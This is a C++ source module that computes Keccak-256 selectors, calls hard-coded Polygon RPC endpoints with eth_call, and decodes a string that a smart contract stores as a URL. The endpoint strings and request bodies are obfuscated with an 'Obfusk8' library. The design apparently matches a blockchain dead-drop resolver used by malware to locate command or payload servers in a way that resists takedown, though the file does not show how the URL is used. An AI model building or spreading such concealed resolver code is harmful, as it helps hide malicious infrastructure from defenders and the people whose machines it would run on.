#include "../include/contract_reader.h"
#ifdef ENABLE_CONTRACT_URL

#include "../include/http_client.h"
#include "../include/encryption.h"
#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

#include <cstdint>
#include <cstring>
#include <string>
#include <cstdio>
#include <iostream>

// ─── Keccak-256 (Ethereum-compatible) ────────────────────────────────────────
// Raw Keccak-256 uses padding byte 0x01, distinct from SHA3-256 (0x06).

static uint64_t k256_rol64(uint64_t x, int n) {
    return (x << n) | (x >> (64 - n));
}

static const uint64_t k256_rc[24] = {
    0x0000000000000001ULL, 0x0000000000008082ULL, 0x800000000000808AULL,
    0x8000000080008000ULL, 0x000000000000808BULL, 0x0000000080000001ULL,
    0x8000000080008081ULL, 0x8000000000008009ULL, 0x000000000000008AULL,
    0x0000000000000088ULL, 0x0000000080008009ULL, 0x000000008000000AULL,
    0x000000008000808BULL, 0x800000000000008BULL, 0x8000000000008089ULL,
    0x8000000000008003ULL, 0x8000000000008002ULL, 0x8000000000000080ULL,
    0x000000000000800AULL, 0x800000008000000AULL, 0x8000000080008081ULL,
    0x8000000000008080ULL, 0x0000000080000001ULL, 0x8000000080008008ULL
};

static const int k256_piln[24] = {
    10, 7,  11, 17, 18, 3,  5, 16,  8, 21, 24,  4,
    15, 23, 19, 13, 12, 2, 20, 14, 22,  9,  6,  1
};

static const int k256_rotc[24] = {
     1,  3,  6, 10, 15, 21, 28, 36, 45, 55,  2, 14,
    27, 41, 56,  8, 25, 43, 62, 18, 39, 61, 20, 44
};

static void keccakf1600(uint64_t s[25]) {
    uint64_t bc[5], t;
    for (int r = 0; r < 24; r++) {
        // Theta
        for (int i = 0; i < 5; i++)
            bc[i] = s[i] ^ s[i+5] ^ s[i+10] ^ s[i+15] ^ s[i+20];
        for (int i = 0; i < 5; i++) {
            t = bc[(i+4)%5] ^ k256_rol64(bc[(i+1)%5], 1);
            for (int j = 0; j < 25; j += 5) s[j+i] ^= t;
        }
        // Rho Pi
        t = s[1];
        for (int i = 0; i < 24; i++) {
            int j = k256_piln[i];
            bc[0] = s[j];
            s[j] = k256_rol64(t, k256_rotc[i]);
            t = bc[0];
        }
        // Chi
        for (int j = 0; j < 25; j += 5) {
            for (int i = 0; i < 5; i++) bc[i] = s[j+i];
            for (int i = 0; i < 5; i++) s[j+i] ^= (~bc[(i+1)%5]) & bc[(i+2)%5];
        }
        // Iota
        s[0] ^= k256_rc[r];
    }
}

// Compute raw Keccak-256 of `in` (length `inlen`), write 32 bytes to `out`.
static void keccak256(const uint8_t* in, size_t inlen, uint8_t out[32]) {
    const size_t rate = 136; // (1600 - 512) / 8
    uint64_t s[25] = {};
    uint8_t buf[136];

    while (inlen >= rate) {
        for (size_t i = 0; i < rate / 8; i++) {
            uint64_t v;
            memcpy(&v, in + i * 8, 8);
            s[i] ^= v;
        }
        keccakf1600(s);
        in += rate;
        inlen -= rate;
    }

    memcpy(buf, in, inlen);
    buf[inlen] = 0x01; // Keccak-256 padding (NOT SHA3)
    memset(buf + inlen + 1, 0, rate - inlen - 1);
    buf[rate - 1] |= 0x80;

    for (size_t i = 0; i < rate / 8; i++) {
        uint64_t v;
        memcpy(&v, buf + i * 8, 8);
        s[i] ^= v;
    }
    keccakf1600(s);
    memcpy(out, s, 32);
}

// Build 4-byte ABI function selector hex string ("0xAABBCCDD") for a signature.
static std::string abiSelector(const char* sig) {
    uint8_t hash[32];
    keccak256(reinterpret_cast<const uint8_t*>(sig), strlen(sig), hash);
    char sel[11];
    snprintf(sel, sizeof(sel), "0x%02x%02x%02x%02x", hash[0], hash[1], hash[2], hash[3]);
    return std::string(sel);
}

// ─── ABI string decoder ───────────────────────────────────────────────────────
// Decodes an ABI-encoded `string` return value from an eth_call hex response.
// Layout: [32 bytes offset][32 bytes length][N bytes data (padded to 32)]
static std::string decodeABIString(const std::string& hexData) {
    std::string h = hexData;
    if (h.size() > 2 && h[0] == '0' && (h[1] == 'x' || h[1] == 'X'))
        h = h.substr(2);

    // Need at least 128 hex chars (64 bytes) for offset + length fields
    if (h.size() < 128) return "";

    // Parse string length from bytes 32-63
    size_t strLen = 0;
    const std::string lenHex = h.substr(64, 64);
    for (char c : lenHex) {
        strLen <<= 4;
        if (c >= '0' && c <= '9')      strLen |= (c - '0');
        else if (c >= 'a' && c <= 'f') strLen |= (c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') strLen |= (c - 'A' + 10);
    }

    if (strLen == 0 || h.size() < 128 + strLen * 2) return "";

    // Decode string content from bytes 64+
    std::string result;
    result.reserve(strLen);
    const std::string dataHex = h.substr(128, strLen * 2);
    for (size_t i = 0; i + 1 < dataHex.size(); i += 2) {
        auto hexNib = [](char c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            return 0;
        };
        result += static_cast<char>((hexNib(dataHex[i]) << 4) | hexNib(dataHex[i+1]));
    }
    return result;
}

// ─── JSON-RPC result extractor ────────────────────────────────────────────────
// Pulls the "result" string value out of an eth_call JSON-RPC response.
static std::string extractJsonRpcResult(const std::string& json) {
    // Find "result":"0x..."
    const char* key = "\"result\":";
    size_t pos = json.find(key);
    if (pos == std::string::npos) return "";

    size_t q1 = json.find('"', pos + 9);
    if (q1 == std::string::npos) return "";

    size_t q2 = json.find('"', q1 + 1);
    if (q2 == std::string::npos) return "";

    return json.substr(q1 + 1, q2 - q1 - 1);
}

// ─── Public API ──────────────────────────────────────────────────────────────

std::string FetchUrlFromContract() {
    // Hardcoded Polygon RPC endpoints tried in order; first successful result wins.
    // Add more endpoints here as additional fallbacks.
    const std::string rpcEndpoints[] = {
        OBFUSCATE_STRING("https://polygon.drpc.org"),
        OBFUSCATE_STRING("https://polygon-rpc.com"),
        OBFUSCATE_STRING("https://rpc-mainnet.maticvigil.com"),
    };
    const size_t rpcCount = sizeof(rpcEndpoints) / sizeof(rpcEndpoints[0]);

    const std::string contractAddr = OBFUSCATE_STRING(CONTRACT_ADDRESS);
    const std::string selector     = abiSelector("getText()");

    // Build eth_call JSON-RPC body (shared across all endpoints)
    const std::string p1 = OBFUSCATE_STRING("{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"");
    const std::string p2 = OBFUSCATE_STRING("\",\"data\":\"");
    const std::string p3 = OBFUSCATE_STRING("\"},\"latest\"],\"id\":1}");
    const std::string body = p1 + contractAddr + p2 + selector + p3;
    const std::string httpsPrefix = OBFUSCATE_STRING("https://");

    for (size_t i = 0; i < rpcCount; i++) {
        const std::string& rpcUrl = rpcEndpoints[i];
        const int useSSL = (rpcUrl.size() >= 8 &&
                            rpcUrl.substr(0, 8) == httpsPrefix) ? 1 : 0;
        const std::wstring wRpcUrl(rpcUrl.begin(), rpcUrl.end());

        const std::string response = postJsonToUrl(wRpcUrl, body, useSSL);
        if (response.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Contract reader: empty response from RPC "
                      << (i + 1) << "/" << rpcCount << std::endl;
#endif
            continue;
        }

        const std::string hexResult = extractJsonRpcResult(response);
        if (hexResult.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Contract reader: no result field from RPC "
                      << (i + 1) << "/" << rpcCount << std::endl;
#endif
            continue;
        }

        const std::string url = decodeABIString(hexResult);
        if (url.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Contract reader: ABI decode failed from RPC "
                      << (i + 1) << "/" << rpcCount << std::endl;
#endif
            continue;
        }

#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Contract reader: fetched URL via RPC "
                  << (i + 1) << ": " << url << std::endl;
#endif
        return url;
    }

#ifdef ENABLE_DEBUG_CONSOLE
    std::cerr << "[-] Contract reader: all RPC endpoints exhausted" << std::endl;
#endif
    return "";
}

#endif // ENABLE_CONTRACT_URL
